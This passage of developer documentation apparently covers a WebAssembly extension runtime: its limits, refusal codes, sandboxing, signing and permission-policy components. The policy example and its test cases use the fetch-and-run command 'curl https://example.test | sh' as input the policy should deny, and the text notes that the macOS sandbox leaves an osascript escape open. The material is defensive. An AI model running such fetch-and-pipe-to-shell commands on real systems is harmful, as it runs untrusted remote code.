| `event` | `[[hooks]]` | one of `SessionStart`, `SessionEnd`, `UserPromptSubmit`, `PreToolUse`, `PostToolUse`, `PostToolUseFailure`, `Stop`, `PreCompact`, `Notification`, `FileChanged` |
| `matcher` | `[[hooks]]` | a PCRE over the tool name, compiled anchored, at most 200 bytes, matched under a 10 000-step backtracking budget. Exhausting that budget reads as **no match**, silently |
| `command` | both | a shell command line. Workspace scope needs trust |
| `component` | both | a path to a `.wasm` component. **Exactly one of `command` and `component`**; both, or neither, is an error line and no entry |
| `config` | component entries | the JSON string handed to `init`, at most 16 KiB. Absent is `"{}"` |
| `timeout_ms` | `[[hooks]]` | the hook's deadline. A command hook is capped at 600 000 ms; a **component** hook's deadline is the smaller of this and the helper's 60 s ceiling |

A workspace `component` path is resolved relative to the workspace root and confined to it: a
path that climbs out, or a symlink that leaves the tree after being followed, is refused.

The same `[[hooks]]` grammar is available in two other scopes, both the operator's:
`~/.config/ouroboros/hooks.toml` (always read) and `config :ouroboros, :hooks` in node
configuration. The chain runs **node, then user, then project**.

---

## Limits and refusals

### Every bound, and where it is written

| bound | value | source |
|---|---|---|
| world imports | `log`, and nothing else | `tui/wasm/wit/capability.wit` |
| component bytes, helper read | 64 MiB | `MAX_COMPONENT_BYTES`, `tui/wasm/src/host.rs` |
| component bytes, hook entry | 16 MiB | `@max_component_bytes`, `lib/ouroboros/provider/native/hooks.ex` |
| code bytes | 4 MiB | `MAX_CODE_BYTES`, `tui/wasm/src/shape.rs` |
| functions | 20 000 | `MAX_FUNCTIONS`, `tui/wasm/src/shape.rs` |
| types | 8 192 | `MAX_TYPES` |
| imports / exports | 1 024 each | `MAX_IMPORTS`, `MAX_EXPORTS` |
| other index-space definitions | 16 384 | `MAX_DEFINITIONS` |
| data and element segment bytes | 4 MiB | `MAX_SEGMENT_BYTES` |
| nesting depth | 8 | `MAX_DEPTH` |
| core modules / nested components | 64 each | `MAX_CORE_MODULES`, `MAX_NESTED_COMPONENTS` |
| sections | 8 192 | `MAX_SECTIONS` |
| fuel | ≤ 10¹² | `MAX_FUEL`, `tui/wasm/src/host.rs` |
| memory per instance | 64 KiB … 1 GiB | `MIN_MEMORY_BYTES`, `MAX_MEMORY_BYTES` |
| deadline per call | ≤ 60 000 ms | `MAX_DEADLINE_MS` |
| reply bytes | 1 MiB | `MAX_RESULT_BYTES` |
| memories / tables / core instances per store | 4 / 4 / 16 | `MAX_MEMORIES`, `MAX_TABLES`, `MAX_CORE_INSTANCES` |
| table elements | 100 000 | `MAX_TABLE_ELEMENTS` |
| log lines per call | 16 | `MAX_LOG_LINES_PER_CALL` |
| components cached / instances live | 64 / 256 | `MAX_COMPONENTS`, `MAX_INSTANCES` |
| helper frame | 8 MiB | `DEFAULT_MAX_FRAME_BYTES`, `tui/wasm/src/codec.rs` |
| a capability's default bounds | fuel 100 000 000, memory 64 MiB, deadline 5 000 ms | `:wasm, :capability_limits`, `config/config.exs` |
| the ceiling a deployment's own bounds are clamped to | fuel 10¹⁰, memory 256 MiB, deadline 30 000 ms | `:wasm, :capability_limits_max` |
| component store budget | 512 MiB | `:wasm, :store_budget_bytes` |
| pool request queue | 8 | `@max_queue`, `lib/ouroboros/wasm/pool.ex` |
| instance deadlines the pool tracks | 512, oldest-first | `@max_instances`, same file |
| pool request / handshake / call margin | 30 000 / 5 000 / 10 000 ms | `:wasm` keys in `config/config.exs` |
| untrusted hook shas per helper lifetime | 16 | `@hook_component_budget`, `lib/ouroboros/wasm/pool.ex` |
| untrusted components per workspace | 8, across `[[hooks]]` and `[checks]` | `@max_untrusted_components`, `hooks.ex` |
| hooks / checks read from one file | 50 / 20 | `@max_hooks`, `@max_checks`, `hooks.ex` |
| hook output bytes | 256 KiB | `@max_output_bytes`, `hooks.ex` |
| `additionalContext` bytes | 8 KiB | `@max_context_bytes`, `hooks.ex` |
| hook `config` bytes | 16 KiB | `@max_hook_config_bytes`, `hooks.ex` |
| `ouroboros.toml` bytes | 256 KiB | `@max_config_bytes`, `hooks.ex` |
| `matcher` bytes / backtracking steps | 200 / 10 000 | `@max_matcher_bytes`, `@matcher_match_limit` |
| a `[checks]` name or path in a message | 200 bytes | `@max_check_name_bytes` |
| upload chunk / in flight / idle / lifetime | 512 KiB / 8 / 10 min / 30 min | `lib/ouroboros/wasm/upload.ex` |
| bundle envelope / manifest / manifest heap | 64 KiB / 32 KiB / 128 KiB | `lib/ouroboros/wasm/bundle.ex` |
| bundle component bytes | 16 MiB | `@default_max_component_bytes`, `bundle.ex` |
| `capability` tool message / reply | 64 KiB each | `lib/ouroboros/provider/native/tools/capability.ex` |
| `describe` shown in a listing | 200 chars | `@max_summary_chars`, same file |
| capabilities listed | 50 | `@max_listed`, same file |
| `describe` document, and its `version` | 4 KiB, 64 bytes | `@max_document_bytes`, `@max_version_bytes` in `Wasm.Capability.Describe`, `lib/ouroboros/wasm/capability.ex` |
| `describe` summary / examples | 200 chars / 4 | `@max_summary_chars`, `@max_examples`, same module |

### Every refusal, and what to do about it

The helper's own vocabulary — a private JSON-RPC code and a stable name each, from
`tui/wasm/src/refusal.rs`. `ouro wasm inspect`, `run` and `hook` print the name.

| name | code | what held, and the fix |
|---|---|---|
| `sha_mismatch` | -32001 | the file changed between the owner's read and the helper's. Rebuild and re-run |
| `unsupported_world` | -32002 | the exports are not this world's. Almost always a `std` build: drop `#![no_std]`'s absence, check `wit-bindgen`'s features |
| `undefined_import` | -32003 | the component imports something the world does not declare. `ouro wasm inspect` names it; the usual cause is `std`, or a crate that pulls WASI |
| `unreadable_component` | -32004 | the path could not be read, or is over the byte cap |
| `compile_failed` | -32005 | wasmtime refused the bytes. A disabled proposal — relaxed SIMD, tail calls, extended const, GC, memory64 — reaches you here |
| `unknown_component` | -32006 | the sha was evicted from the cache. Load again; peers do this for you |
| `unknown_instance` | -32007 | no live instance by that name, including one just poisoned by a trap |
| `instance_exists` | -32008 | that instance name is live; drop it first |
| `limits_out_of_range` | -32009 | a limit is outside the helper's range. `ouro wasm doctor` reports the maxima |
| `instantiate_failed` | -32010 | the linker had nothing for an import, or a count limit denied a memory, table or core instance |
| `fuel_exhausted` | -32011 | the guest burned its whole fuel budget. Raise `--fuel` locally; on a node it is the deployment's `limits` |
| `deadline_exceeded` | -32012 | the epoch deadline interrupted the guest |
| `memory_limit` | -32013 | growth was denied and the guest could not continue |
| `trapped` | -32014 | the guest trapped. Return `Err(String)` instead: a trap costs the instance, an error does not |
| `unknown_export` | -32015 | `call` named something outside the world's exports |
| `oversize_result` | -32016 | the reply is larger than a reply may be |
| `guest_error` | -32017 | the guest's own `err(string)` — its answer, not the host's. The instance stays live |
| `too_many_components` | -32018 | the cache is full and every entry has a live instance, so nothing can be evicted |
| `too_many_instances` | -32019 | the instance table is full; drop one |
| `component_too_complex` | -32020 | the bytes are shaped to be expensive to compile and were refused before the compiler saw them. `ouro wasm inspect`'s `shape` block says which reading was over |
| `invalid_params` | -32602 | a statement about the *request*, never about the component |

The pool adds its own, as atoms rather than codes, in
`lib/ouroboros/wasm/pool.ex`: `:unavailable` (no helper binary on disk — `make wasm` builds
one, and nothing else does), `:broken` (the helper died; the pool cools down for 15 s and
retries), `:busy` (the queue is full), `:timeout`, `:hook_component_budget` (this workspace has
spent its sixteen untrusted shas), `{:invalid_limits, _}`, `{:invalid_lane, _}`,
`{:invalid_instance, _}`, `{:frame_too_large, _, _}`.

The gateway's are the runtime's own, shared by every verb (`lib/ouroboros/gateway/methods.ex`).
The wasm verbs use no private band of their own:

| code | name | when |
|---|---|---|
| -32001 | `unauthenticated` | a frame before `hello`, or the wrong token |
| -32002 | `protocol_mismatch` | `hello` named a protocol this build does not speak |
| -32003 | `scope_denied` | the listener is `:read` and the verb is `:operate` — every `wasm.upload`/`sign`/`deploy`/`rollback` is |
| -32004 | `unavailable` | the node cannot do this at all. `wasm.sign` answers it when no signing service is reachable |
| -32005 | `upstream_timeout` | the node did not answer inside the verb's ceiling |
| -32006 | `upstream_error` | the node refused; `data` carries the reason — `untrusted_signer`, `epoch_not_allocated`, a bundle refusal |
| -32007 | `not_found` | an id this node does not hold |
| -32602 | `invalid_params` | a parameter is missing, mistyped, or not in the verb's closed set |

`wasm.status` and `wasm.list` are `:read`; everything that can start the helper or change what
runs is `:operate`. There is deliberately no `wasm.load`, `wasm.drop`, `wasm.instantiate` or
`wasm.call`: each would be a socket deciding what this node runs, rather than a signer deciding
what may exist (WASM.md D15).

---

## Operating a node

### Build the helper

```sh
make wasm
```

builds `ouro-wasm` into `priv/wasm/` and fans it out to `_build/*/lib/ouroboros/priv/wasm/`,
then prints its `doctor`. **Presence on disk is the operator opt-in** — nothing else builds it,
and a node without it answers `:unavailable` rather than failing. `make wasm-guest` builds the
acceptance guest; `make wasm-examples` builds the SDK's four worked components.

The helper carries a wasmtime and needs a newer Rust than the rest of the workspace: the floor
is 1.95, pinned in `tui/wasm/Cargo.toml`.

The helper is found in exactly three places, in order: `--helper <path>`, an **absolute**
`$OUROBOROS_WASM_HELPER`, and the `ouro-wasm` beside the *resolved* `ouro` binary. Nothing is
derived from the working directory — `ouro wasm` is typed in the directory a component author
is working in, which is the directory the component came from. Every candidate is canonicalised
and vetted: a regular file, executable, owned by you or root, not group- or world-writable.

### Configuration

`config :ouroboros, :wasm` in `config/config.exs`. Everything in it is a bound, so a typo falls
back to the default rather than widening one:

| key | default | is |
|---|---|---|
| `helper_path` | `:bundled` | `:bundled` resolves the application's own `priv/` or a sibling of `ouro`. An override must be an absolute path |
| `handshake_timeout_ms` | 5 000 | how long the `doctor` handshake may take |
| `request_timeout_ms` | 30 000 | the default per-request wait |
| `call_margin_ms` | 10 000 | transport slack over a guest's own deadline |
| `max_frame_bytes` | 8 MiB | the line-framed protocol's cap |
| `broken_ms` | 15 000 | the cooldown after the helper dies |
| `store_budget_bytes` | 512 MiB | the component store's byte budget |
| `capability_limits` | fuel 100 000 000, memory 64 MiB, deadline 5 000 ms | the bounds a capability runs under when its deployment names none. Declared whole — all three keys or none |
| `capability_limits_max` | fuel 10¹⁰, memory 256 MiB, deadline 30 000 ms | the ceiling a deployment's own declaration is clamped to, element-wise |
| `helper_sandbox` | `:required` | whether this node insists on an OS sandbox around the helper. `:off` spawns it plain |
| `helper_readable` | `[]` | extra absolute roots the sandboxed helper may read, for a node whose components are not under its own data directory. Vetted whole: see below |

**The helper runs inside the OS sandbox, and a node that cannot apply one runs no helper.**
Since W16 `ouro-wasm` is spawned through the same sandbox the native agent's shell uses, under a
policy that is closed on reads: it may read the platform's toolchain roots, the directory its own
binary is in, this node's **component store** (`<data_dir>/wasm/components`) and the forge's
build directory — and nothing else under your data directory, because the signing journal, the
grants, the upload area and the forge's cargo home are none of its business. Component hooks are
staged into that store before the helper is told a path, so serving a repository does not widen
the fence. It may write only in a `0700` scratch this node creates under
`<data_dir>/wasm/scratch/` and removes with the child. **No network, and that includes
loopback** — the helper speaks over a pipe, and a loopback socket would reach every service on
the machine, this node's gateway included.

`helper_sandbox` is `:required` by default, and under it a node with no sandbox backend, a
backend with no read allow-set (`ouro-sandbox` before W17), a `bwrap` that cannot unshare a
network namespace, or no data directory **refuses to start the helper at all**: every lane-W
request answers `{:error, :broken}` and `wasm.status` carries
`sandbox: {posture: "refused", backend, reason, readable}` beside a helper phase of `broken`.
(`ouro wasm doctor` does not print that block yet; read it from the verb. `readable` is the
effective read set as basenames — the full paths are on the node, in `Wasm.Pool.status/1` — and
it is where you check that a `helper_readable` you configured is actually in force.) That is
deliberate — a contained helper that is not contained is worse than none — and the way out is a
backend (`bwrap` on Linux, `sandbox-exec` on macOS), a data directory, or the explicit
`helper_sandbox: :off`, which spawns it plain, says so in `wasm.status` and logs a warning on
every spawn. The same policy wraps `ouro-wasm precompile` at signing time, with that
signature's own directory writable and nothing else; a signer that cannot apply it signs the
source form and names why in the receipt's `precompile_skipped`.

`helper_readable` widens the read set for a node whose components are not under its own data
directory, and it is **vetted whole**: each entry must be an absolute path that resolves to a
directory that exists, must not be `/`, and must not be your data directory or an ancestor of
it. One bad entry rejects the entire list with a warning naming it, and `wasm.status` then shows
the node's own roots alone — which is how you tell "configured" from "in force".

What the macOS wall does **not** close is written down in docs/WASM.md D25: `process-exec` over
the readable `/usr/bin` and `/bin`, `mach-lookup`, `sysctl-read`, and metadata reads over the
whole filesystem. A compromised artifact inside the fence can still run `curl` or `osascript`,
and `osascript`'s `do shell script` leaves the sandbox. The fence bounds what it can *read and
write* and takes its network away; it is not a syscall policy.

Two more keys govern the lane from outside `:wasm`:

* `config :ouroboros, :trusted_workspaces` — canonical workspace roots whose **command** hooks
  and command `[checks]` may run. Trust cannot come from inside a workspace: the shell may run
  without an OS sandbox, and repository contents are writable by definition under
  `workspace_write`, so an in-repository marker would be self-authorizing.
* `config :ouroboros, :hooks` — node-scope `[[hooks]]` entries, in the same grammar as the TOML
  file. It is the operator's own scope and runs first. A node hook has no configuration
  directory of its own, so it runs in the session's workspace.

### Signing

Keys live on `:signer`-role nodes and never travel — a `:signer`'s whole supervision tree is
cluster formation and the signing service, so it holds a key and runs nothing that could be
asked for anything else. `ouro wasm keygen` writes a seed in exactly the format
`Ouroboros.Upgrade.Signing.Service` reads, and prints the path it wrote **absolute and
canonical**, because `config/runtime.exs` refuses a relative `OUROBOROS_SIGNER_KEY_PATH`
outright and a line an operator pastes has to be one a signer node will accept. The signer node
sets `OUROBOROS_SIGNER_KEY_PATH` and `OUROBOROS_SIGNER_ID`; every core node that must accept
what it signs sets `OUROBOROS_UPGRADE_TRUSTED_SIGNERS=<id>:<base64 public key>`; and core nodes
reach the signer through `config :ouroboros, :signing_node` (`OUROBOROS_SIGNING_NODE`).

Epoch allocation is over the connected nodes that hold a rollout register, so a `:signer` in
the cluster is not asked for a plane it does not run and signing works on exactly this
topology.

A node that can reach no signing service refuses by name rather than generically:

```
ouro: the runtime refused wasm.sign: unavailable (-32004): this node has no signing service:
OUROBOROS_SIGNING_NODE must name the :signer node that holds the key, or this node must run
one itself. A component is signed where the key is, never here
```

A signature this node does not trust is refused at deploy, before the store, the helper or the
register hears about it — `upstream_error` carrying `["untrusted_signer", "<id>"]`.

### The store, and what survives

Component bytes are content-addressed at `<data_dir>/wasm/components/sha256-<hex>.wasm` and
they are kept, deliberately — a divergence from the BEAM lane, where bytes die at promote. It
buys reboot survival for a `:live` capability, a real diff for a re-forge, and rollback
material that never expires.

The budget is `store_budget_bytes`. A prune never evicts a sha a `:live` or `:deploying` entry
references, and `:quarantined` bytes are kept as evidence. Signed manifests are written beside
the bytes and are **never** pruned — but they are counted, so a budget cannot be exceeded
quietly by a class of file it ignored.

The helper's own cache is separate and does evict: 64 compiled components, least recently used,
never one with a live instance, named in the `load` result and counted by `doctor`. Eviction is
a reclaim rather than a revocation — the sha is simply unknown again and the next `load`
recomputes the digest and the world check exactly as the first did.

### Readiness

```sh
ouro wasm doctor
```

```
WebAssembly containment: helper present (ouro-wasm)
  helper pool: ready (pid 92436), wasmtime 48.0.1, 0 instance(s), 0 owned, 0 pending drop(s)
  world: ouroboros:capability@0.1.0, helper reports usable
  limits: deadline 60000, memory 1073741824, component 67108864
  hook components: 0 of 16 used
  store: 1 component(s), 56148 byte(s) of 536870912 byte(s) budget, 1 protected by a rollout
  rollouts: 2 lane-W (1 live, 0 deploying, 0 quarantined, 0 superseded, 1 rolled back)
  boot restart: enabled
```

It asks the gateway verb `wasm.status`, which is `:read` and **starts nothing**: there is
deliberately no `--probe`, because starting the helper to see whether it starts would answer a
different question. Before the first component needs it the pool reports `idle`, and that is
the healthy answer. `ouro wasm ls` (`wasm.list`, also `:read`) is the inventory: every lane-W
rollout the register knows, which of the two forms this node loads each one from, and every
component in the store.

Neither surface reports absolute paths: `wasm.status` and `wasm.list` are `:read`, and a
readiness surface is not a directory listing.

### When the fast form is not yours

Signing compiles the component once, on the node that signs, and puts wasmtime's serialized
form in the bundle beside the source (docs/WASM.md D22–D24). A node loads that form only when
its own helper reports **exactly** the wasmtime version and **exactly** the target triple the
signer recorded — `ouro-wasm doctor` prints both, and `ouro wasm inspect <file>.cwasm` prints
what an artifact claims, with one line saying whether this machine could map it. Where the two
disagree the node compiles the component itself, exactly as it did before, and logs one line
naming which half differed (`{:wasmtime_mismatch, "48.0.1", "47.0.2"}`); `ouro wasm ls`'s
`FORM` column then reads `source` on those nodes and `precompiled` on the rest, and `?` where a
node cannot say — no manifest it can read, or a helper it has not yet spoken to. Nothing is
broken in that state and nothing needs fixing: the slow path is the path every node has always
had. What it costs is the compile, on each node, for that capability. If you want the fast form
across a mixed fleet, sign once per build — or sign with `ouro wasm sign --no-precompile` and
keep the bundle small, which is also what a signing node with no helper does by itself.

If the node's helper refuses the artifact after all — a file that rotted on disk, a header that
does not describe it — the node loads the source form and logs one line saying so. A fallback is
never a fault: the slow path is the path every node has always had, and nothing about a
capability's behaviour depends on which form ran.

### Refusing the fast form on purpose

```
config :ouroboros, :wasm, accept_precompiled: false
```

This is the one setting in lane W an operator reaches for because of *who signed*, not because
of what a component does, and it is worth knowing before you need it. The precompiled form is
machine code, and `Component::deserialize` does not validate machine code against a malicious
producer — that is what the signature is for. So a signing key you trust can now put executing
code into your helper process, where before W8 the worst it could put there was a contained
component: bounded by fuel, by a deadline, by a memory ceiling, by a linker that defines one
function. The helper is still a separate process, so what that reaches is a Port rather than the
node — and since W16 that process is OS-sandboxed, so inside it the reachable surface is the
platform's toolchain roots, this node's component store, the forge's build directory, a scratch
and no network at all, rather than everything the daemon's user can open. That is a wall around
the code, not a check on it: the machine code still executes, and on macOS it can still run
`/usr/bin` binaries inside the fence (docs/WASM.md D25 names what the wall leaves open).

Set this to `false` and every node compiles every component for itself, exactly as before W8:
no redeploy, no resigning, nothing to change in any bundle. What it costs is the compile, per
node, per capability. It is the right answer while a signing key's custody is in question, and
`ouro wasm ls` will read `source` everywhere while it is set.

### Reboot

At `:core` boot a supervised one-shot task restarts the wrapper agents for `:live` lane-W
entries whose signed manifest declares a `start` block — the `--start-config` of the sign
above. The id is derived from the artifact's name (`wasm/<name>`) by both the deploy path and
the boot path, so the two cannot disagree about which process a component owns.

---

## Policy components

A policy component decides permissions. The runtime asks it about every tool call
`Ouroboros.Control.Permissions` had no rule for, and lets it say one of three words: `deny`,
`ask`, or `allow`. `deny` stands. `ask` stands, and is the question the runtime was already
going to ask. `allow` is honoured only for the tools an operator listed. That asymmetry is the
whole design, and it is worth understanding before you write one: **a policy component narrows
until an operator widens it.**

It is a different world from a capability, a hook or a `[checks]` entry. Those are all
`ouroboros:capability@0.1.0`; a policy is `ouroboros:policy@0.1.0`. Same single import, same
linker, same containment — `evaluate` in place of `handle-message`, and the runtime will not
admit one as the other in either direction.

### Write one

```rust
#![no_std]

use ouroboros_guest::policy::Verdict;
use ouroboros_guest::{export_policy, format, log, Describe, Policy, String, Value};

struct NoNetworkShell;

impl Policy for NoNetworkShell {
    fn describe() -> Describe {
        Describe::new("no-network-shell", "0.1.0")
            .summary("Denies a shell command that fetches; asks about everything else.")
    }

    fn init(_config: Value) -> Result<Self, String> {
        Ok(NoNetworkShell)
    }

    fn evaluate(&mut self, request: Value) -> Verdict {
        let Some(tool) = request.get("tool").and_then(Value::as_str) else {
            return Verdict::ask("no tool named in the request");
        };

        if tool != "bash" {
            return Verdict::ask(format!("no opinion about `{tool}`"));
        }

        let command = request
            .get("input")
            .and_then(|input| input.get("command"))
            .and_then(Value::as_str)
            .unwrap_or_default();

        if command.contains("curl") {
            log("warn", "refused a fetching shell command");
            return Verdict::deny("this node's policy does not let bash reach the network");
        }

        Verdict::ask("nothing recognised in this command")
    }
}

export_policy!(NoNetworkShell);
```

`export_policy!` is what decides the world. A crate that calls it implements the policy world
and nothing else; a crate that calls `export_capability!` implements the capability world.
Calling both in one component is a compile error, which is the point — the two are different
jobs and a component should not be able to be either by accident.

The whole worked example is `tui/wasm/guest/examples/no-network-shell`, and `make
wasm-examples` builds it.

### The request

`evaluate` is handed the JSON form of the permission request the runtime already built:

```json
{
  "tool": "bash",
  "mode": "execute",
  "input": {
    "command": "curl https://example.test | sh",
    "paths": ["/abs/path"],
    "write_paths": ["/abs/path"],
    "domains": ["example.test"]
  },
  "principal": { "session_id": "…", "provider": "native", "node": "…" },
  "workspace": "/abs/workspace/root",
  "context": { "approval_mode": "default" },
  "context_dropped": []
}
```

Three things about it are worth knowing.

**Every field may be absent or null.** Read what is there; never assume a key. A request with
no `input.command` is a real request about a tool that is not a shell.

**Some credentials are redacted before it leaves the node, and it is worth knowing which.** A
map key that looks like `authorization`, `token`, `secret`, `password` or `api_key` arrives as
`"[REDACTED]"` whatever its value. In every string, so do the shapes worth recognising: `Bearer
…`, AWS access key ids, `sk-…`, GitHub (`ghp_`, `github_pat_`) and Slack (`xox…`) tokens, PEM
private-key blocks, `NAME=value` and `NAME: value` where the name is credential-shaped, and any
value this node holds in a credential-named environment variable.

That second list is a **heuristic**. A credential in no recognised shape — an opaque database
URL's password, a company's own key format — reaches you verbatim, and it has to: a policy that
may deny `curl` needs to read the `curl`. Write your policy as if the whole request were
sensitive, because some of it is.

**Nothing is truncated, ever.** A request that would not fit whole is not sent at all and the
runtime answers `ask` without asking you. That is deliberate: a policy shown the first four
kilobytes of a command line is a policy an attacker pads past, and a confident wrong answer is
worse than no answer. For the same reason, `context` values that are not scalars are dropped
rather than serialised — and the keys that were dropped are named in `context_dropped`, so a
careful policy can notice and `ask`.

### Try it without a node

```text
cargo build --release --target wasm32-wasip2

ouro wasm policy target/wasm32-wasip2/release/no_network_shell.wasm \
  --request '{"tool":"bash","input":{"command":"curl https://example.test | sh"}}'
```

```text
decision: deny
rule: no-network-shell refuses a shell command containing `curl`: this node's policy does not
      let the model reach the network through bash
the node would refuse this call and state the rule above
took: 3ms

guest log:
  ouro-wasm: guest policy/ouro-wasm-policy [warn] refused a fetching shell command
```

`--request` takes JSON on the command line, a path to a file holding it, or `-` for standard
input. `--json` prints the verdict, the world the bytes were admitted to, the rule as the
runtime would record it, and the guest's own log lines. The command exits non-zero on a `deny`,
so it drops into a script; an `ask` exits zero, because an ask is not a failure.

If you hand it a capability component it refuses rather than running it — the same refusal the
runtime makes when a manifest's `kind` disagrees with its bytes.

`ouro wasm inspect` works on a policy component too: it asks both worlds and its verdict line
says which one took the bytes (`admitted as a policy component`), with `admitted_as` under
`--json`. A component in neither world reports both refusals, so you can see whether the other
door was even tried.

### Ship it

```text
ouro wasm sign target/wasm32-wasip2/release/no_network_shell.wasm \
  --kind policy \
  --name no-network-shell \
  --author you \
  --import log \
  --eval cases.json

ouro wasm deploy no-network-shell.ouro-wasm
```

`--kind policy` is part of what gets **signed**. That matters more than it looks: the kind is
what decides which of the runtime's two worlds these bytes are ever admitted to, so it is a
claim a signature covers rather than a flag somebody sets at deploy time. A policy manifest
over capability bytes is refused when the target stages it, and so is the reverse.

Two consequences follow from being a policy rather than a capability:

- **No `--start-config`.** A start block is "this runs continuously under this durable mesh
  id"; a policy has no wrapper agent and is reached only by the permission engine, so declaring
  one is refused at signing.
- **A different `--eval`.** A capability's spec is a list of probes over the wrapper agent's
  state. A policy's is a list of *cases*: a request, and the decision this component must reach
  about it. It is required, for the reason every lane-W eval spec is required — there is no
  build peer behind a component, so the signed spec is the test story.

```json
{
  "cases": [
    { "request": { "tool": "bash", "input": { "command": "curl https://example.test" } },
      "expect": { "decision": "deny" } },
    { "request": { "tool": "bash", "input": { "command": "ls -la" } },
      "expect": { "decision": "ask" } }
  ],
  "budget_ms": 20000
}
```

At least one case must expect a `deny` or an `ask`. A spec whose every expectation is `allow`
certifies nothing this lane cares about: `allow` is the verdict the runtime does not honour by
default, so a component could satisfy such a spec on every target and still be the only thing it
must never be.

Those cases are run on every target, against the bytes that are about to go live, before the
rollout marks anything.

### Turn it on

```elixir
config :ouroboros,
  permissions_engine: Ouroboros.Wasm.PolicyEngine,
  wasm_policy: "no-network-shell",
  policy_allowable_tools: []
```

`:wasm_policy` names the component by the name it was deployed under. `nil` — the default —
makes the engine inert: it delegates to `Control.Permissions` and consults nobody. A name that
is not a live rollout **of kind policy** on this node is a misconfiguration, logged once, and
also inert; a policy is not something to half-have.

`:policy_allowable_tools` is the list of tools whose `allow` this node honours from a
component. It is empty by default and that is the decision, not a placeholder. A policy
component is asked about every call the rules did not decide, so an `allow` honoured
unconditionally would be a blanket approval channel with a signature on it — and in this lane a
signature is provenance, not trust. Widen it a tool at a time, deliberately.

**One setting covers every seam.** `:permissions_engine` has four readers: the native loop, the
interactive plane's external approvals, the interactive shell, and — since W18 — the ACP seam,
which is both the `session/request_permission` a vendor process sends and the
`fs/write_text_file` and `terminal/create` an ACP agent asks this runtime to perform. You
configure it once and you get it on all four. A `terminal/create` reaches your component as
`tool: "bash"` with the command line, so the policy you wrote for a shell already covers it; a
write reaches it as `edit` when the file exists and `write` when it does not. Two things an ACP
session does *not* give you today: an agent's `fs/read_text_file` is not gated at that seam at
all, so a read never reaches your component; and plan mode's read-only posture is enforced on
the native lane only. If the engine cannot answer — it raises, it exits, or it says something in
none of the three shapes — the seam asks the human, exactly as it did before an engine was
named. No failure there widens anything; what does widen is your `allow`, for the tools an
operator listed, and that is the bound to reason about.

### What to write, and what not to

**Deny what you recognise; ask about everything else.** That is the shape the defaults reward
and the shape that composes. The engine reaches you only where nothing else had an opinion, so
an `ask` returns the call to the human it was already going to reach. Writing `allow` mostly
means writing `ask` in a longer way.

**Never trap.** A panic is a trap and a trap is an `ask` — you have not failed open, but you
have failed. `evaluate` has no error channel on purpose: there is nothing an error would mean
that `Verdict::ask` does not say better.

**Answer quickly.** One decision is a synchronous round trip on the pool every capability on the
node shares, bounded by `:policy_decision_timeout_ms` — five seconds by default, for the whole
decision. Past it the runtime answers `ask`, drops your instance, and stands a fresh one up for
the next request. A policy is a step function over a request; if yours needs longer than that,
what it is doing is not a permission decision.

**Answer in the grammar.** A verdict is an object with exactly `decision` and `rule` — no third
key, no key twice, `decision` exactly `allow`, `deny` or `ask` in lower case, `rule` a string,
the whole document under a kibibyte. `Verdict::to_json` builds one correctly; write your own and
anything outside that is read as `ask`. The strictness is not fussiness: two implementations read
this document — the runtime and `ouro wasm policy` — and a duplicated key used to make them
disagree about what you said.

**Say why.** Every verdict carries a rule, and it is not decoration: it is the sentence a human
is shown and the string the effect ledger records beside your component's sha. It is bounded at
200 characters and every control character in it is flattened, because it is untrusted text
shown next to the runtime's own words — it appears labelled `[untrusted policy component]`
wherever anybody reads it. A `deny` nobody can act on is a `deny` an operator turns off.

**Be deterministic — nothing here will make you.** The world does most of the work: no clock, no
randomness, no I/O, so there is nothing to be nondeterministic *with*. What is left is instance
state, and it is yours. The runtime keeps one long-lived instance per component, so a policy that
counts calls and denies the eleventh answers two identical requests differently and no seam will
catch it. What stands in for enforcement is the eval spec you signed — your own cases, run on
every target at deploy — and the fact that `allow`, the one verdict a drift could turn into
authority, needs an operator to list the tool. Hold state only where you mean the history to be
part of the decision, and put a case in your spec that says so.

**Know what you are not.** A policy component reads strings. It cannot resolve a shell alias,
see through `$(…)`, canonicalise a path, or know what `x` in `PATH=/tmp:$PATH x` will turn out
to be — command substitution and `eval` defeat prefix matching by construction, which is the
same sentence `Control.Permissions` makes about its own rules. What a policy is worth is "the
obvious spelling is refused, with a reason"; what actually confines a process is the sandbox.

## Forging a capability from an agent

Everything above is about a component you build on your own machine and hand to a node. This
section is the other direction: the node builds it. Same SDK, same world, same signature, same
rollout — what changes is who runs `cargo`, and therefore what has to be true before it does.

### What a forge input is

A Cargo project on `ouroboros-guest`, in the scaffold's shape and nothing else:

```
Cargo.toml        required
Cargo.lock        required
src/lib.rs        required, plus any other src/**.rs
README.md         optional
manifest.json     only for a workspace proposal (see below); not part of the build
```

At most 32 files and one mebibyte in total. Every path relative, no `..`, no absolute paths,
and no symlinks — a symlink in a project directory is refused rather than followed. No
`build.rs`, and no `[package] build` key: a build script is the one file that would run your
code on the node before anything else could check it.

`Cargo.toml` may hold exactly `[workspace]` (empty), `[package]`, `[lib]`, `[dependencies]`
and `[profile.release]`. `[lib]` must be `crate-type = ["cdylib"]`; `[profile.release]` must
be the SDK's, verbatim, because that profile is what keeps the import list at exactly `log`;
`[dependencies]` must name `ouroboros-guest` and nothing else, with exactly one key —
`path`. `features`, `version` and `git` each change what cargo resolves or how it builds,
and the path is replaced with the node's own checkout anyway: your path is a fact about your
machine.

`Cargo.lock` must be, byte for byte, the lock the SDK resolves to, plus your own project's
entry. That is what `cargo generate-lockfile` writes for a project scaffolded with
`ouro wasm new`, so in practice you get it for free and you keep it by not adding
dependencies. It is the pin that makes the build safe to run at all: the crates, the versions
and the checksums are the SDK's, so the only code that executes at build time is the SDK's own
proc macros.

If any of that is wrong the forge says which rule and which file, before it copies anything.

### What the build runs inside

`cargo build --release --target wasm32-wasip2 --locked --offline`, wrapped in the same OS
sandbox the native agent's shell runs in:

* no network — `--offline` as well, so a missing crate is a refusal rather than a download;
* writes only into the build directory, the node's cargo home and a private `TMPDIR`;
* **reads** only from the toolchain, the guest SDK, the `wit` world file beside it and those
  same directories — everything else fails at compile time, in whichever words your node's
  sandbox refuses a read with. "The toolchain" includes the platform roots, and `/etc` is one
  of them on every backend, so **an operator's secrets do not belong under `/etc`**: a build
  can read what is there, and can `stat` (not read) anything the ordinary permissions reach;
* a five-minute wall-clock ceiling and bounded output;
* a node with no sandbox backend does not build at all.

**The read fence is the part to design around.** `include_str!` and `include_bytes!` reach
files at compile time and a `#[path]` module reaches one outside `src/`; all of them are
denied unless the file is inside your project. A capability that needs data ships it as a
`src/**.rs` file or receives it in its `init` config — those are the two doors, and both are
inside the manifest that gets signed. The three backends say it in three different ways, and
none of them is a bug in your project: macOS enforces it with Seatbelt and says
